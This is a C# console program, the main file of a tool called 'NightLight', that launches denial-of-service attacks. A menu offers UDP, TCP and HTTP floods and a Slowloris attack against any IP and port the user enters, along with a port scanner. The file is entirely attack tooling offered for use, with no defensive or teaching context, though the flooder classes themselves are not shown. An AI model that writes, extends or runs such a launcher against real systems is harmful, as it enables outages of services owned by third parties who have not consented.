using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using NightLight.HTTPFlood;
using NightLight.Slowloris;
using NightLight.TCP;
using NightLight.UDP;

namespace NightLight
{
    class Program
    {
        /// <summary>
        /// Holds the build version of the program
        /// </summary>
        private const int build = 7;

        /// <summary>
        /// Main function that gets called when the program starts
        /// </summary>
        static void Main()
        {
            Console.Title = string.Format("NightLight build {0}", build);

            while (true)
            {
                try
                {
                    Console.WriteLine("Choose a tool:");
                    Console.WriteLine("[1]: UDP flood");
                    Console.WriteLine("[2]: TCP flood");
                    Console.WriteLine("[3]: HTTP flood");
                    Console.WriteLine("[4]: Slowloris");
                    Console.WriteLine("[5]: Open port checker");
                    Console.WriteLine();

                    switch (Console.ReadLine())
                    {
                        case "1": //Init UDP flood
                            {
                                Console.WriteLine("Enter the configuration settings for UDP flood");

                                Console.Write("IP: ");
                                string target = Console.ReadLine();

                                Console.Write("Port: ");
                                int port = int.Parse(Console.ReadLine());

                                //Console.Write("Packets: ");
                                //int packets = int.Parse(Console.ReadLine());

                                Console.Write("Attack length (ms): ");
                                int attackLength = int.Parse(Console.ReadLine());

                                //Console.Write("Threads: ");
                                //uint threads = uint.Parse(Console.ReadLine());

                                Console.WriteLine("Press any key to start");
                                Console.ReadKey();

                                UDPFlooder flooder = new UDPFlooder();
                                flooder.Init(target, port, 10, attackLength);
                                flooder.Start();

                                MonitorTool(flooder);
                                break;
                            }

                        case "2": //Init TCP flood
                            {
                                Console.WriteLine("Enter the configuration settings for TCP flood");

                                Console.Write("IP: ");
                                string target = Console.ReadLine();

                                Console.Write("Port: ");
                                int port = int.Parse(Console.ReadLine());

                                Console.Write("Attack length (ms): ");
                                int attackLength = int.Parse(Console.ReadLine());

                                //Console.Write("Beginning connections: ");
                                //int connections = int.Parse(Console.ReadLine());

                                Console.WriteLine("Press any key to start");
                                Console.ReadKey();

                                TCPFlooder flooder = new TCPFlooder();
                                flooder.Init(target, port, 10, attackLength);
                                flooder.Start();

                                MonitorTool(flooder);
                                break;
                            }

                        case "3": //Init HTTP flood
                            {
                                Console.WriteLine("Enter the configuration settings for HTTP flood attack");

                                Console.Write("Address (without http://): ");
                                string Address = Console.ReadLine();

                                Console.Write("Port: ");
                                int port = int.Parse(Console.ReadLine());

                                //Console.Write("Connections: ");
                                //int connections = int.Parse(Console.ReadLine());

                                Console.Write("Attack length (ms): ");
                                int attackLength = int.Parse(Console.ReadLine());

                                Console.WriteLine("Press any key to start");
                                Console.ReadKey();

                                string[] splitted = Address.Split('/');

                                StringBuilder pageURI = new StringBuilder();
                                if (splitted.Length > 1)
                                {
                                    for (int i = 1; i < splitted.Length; i++)
                                    {
                                        pageURI.Append(splitted[i]);
                                        if (i != splitted.Length - 1)
                                            pageURI.Append('/');
                                    }
                                }

                                HTTPFlooder flooder = new HTTPFlooder(splitted[0], pageURI.ToString());
                                flooder.Init(splitted[0], port, 10, attackLength);
                                flooder.Start();

                                MonitorTool(flooder);

                                break;
                            }

                        case "4": //Init Slowloris attack
                            {
                                Console.WriteLine("Enter the configuration settings for Slowloris attack");

                                Console.Write("IP: ");
                                string target = Console.ReadLine();

                                Console.Write("Address: ");
                                string Address = Console.ReadLine();

                                Console.Write("Port: ");
                                int port = int.Parse(Console.ReadLine());

                                //Console.Write("Connections: ");
                                //int connections = int.Parse(Console.ReadLine());

                                Console.Write("Attack length (ms): ");
                                int attackLength = int.Parse(Console.ReadLine());

                                Console.Write("Attack type (POST or GET?): ");
                                AttackType type = (Console.ReadLine().ToUpper() == "POST" ? AttackType.POST : AttackType.GET);

                                Console.WriteLine("Press any key to start");
                                Console.ReadKey();

                                SlowLoris flooder = new SlowLoris(type, Address);
                                flooder.Init(target, port, 10, attackLength);
                                flooder.Start();

                                MonitorTool(flooder);
                                break;
                            }

                        case "5": //Init port checker
                            {
                                Console.Write("IP: ");
                                string ip = Console.ReadLine();

                                Console.Write("Port range start: ");
                                int rangeStart = int.Parse(Console.ReadLine());

                                Console.Write("Port range end: ");
                                int rangeEnd = int.Parse(Console.ReadLine());

                                Console.Write("Timeout (ms): ");
                                int timeout = int.Parse(Console.ReadLine());

                                Console.WriteLine("Press any key to start");
                                Console.ReadKey();

                                Console.WriteLine("Reslowing IP...");

                                IPAddress[] adresses = Dns.GetHostEntry(ip).AddressList;

                                List<int> openPorts = new List<int>();
                                for (int i = rangeStart; i < rangeEnd + 1; i++)
                                {
                                    Console.Write("Trying to connect to [{0}:{1}]: ", ip, i);
                                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                                    try
                                    {
                                        IAsyncResult result = socket.BeginConnect(adresses, i, null, null);

                                        if (result.AsyncWaitHandle.WaitOne(timeout, true))
                                        {
                                            Console.WriteLine("Open", ip, i);
                                            openPorts.Add(i);
                                        }
                                        else
                                        {
                                            Console.WriteLine("Closed (Timeout)", ip, i);
                                        }

                                        try
                                        {
                                            socket.Close();
                                        }
                                        catch { }
                                    }
                                    catch (Exception e)
                                    {
                                        Console.WriteLine("Closed ({0})", e.Message);
                                    }
                                }

                                Console.WriteLine();
                                Console.WriteLine("Open ports: ");
                                foreach (int port in openPorts)
                                {
                                    Console.Write("{0} ", port);
                                }
                                Console.WriteLine();


                                break;
                            }
                    }
                }
                catch (FormatException)
                {
                    Console.WriteLine("That is not a valid number");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    Console.ReadKey();
                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Monitors the ITool object and shows status updates and disposes it if it is needed
        /// </summary>
        /// <param name="tool"></param>
        private static void MonitorTool(ITool tool)
        {
            while (true)
            {
                Console.Clear();
                Console.WriteLine(tool.GetStatus());

                if (tool.IsTimedOut)
                {
                    Console.WriteLine("Timed out. Aborting...");
                    tool.Abort();
                    return;
                }
                Thread.Sleep(500);
            }
        }
    }
}
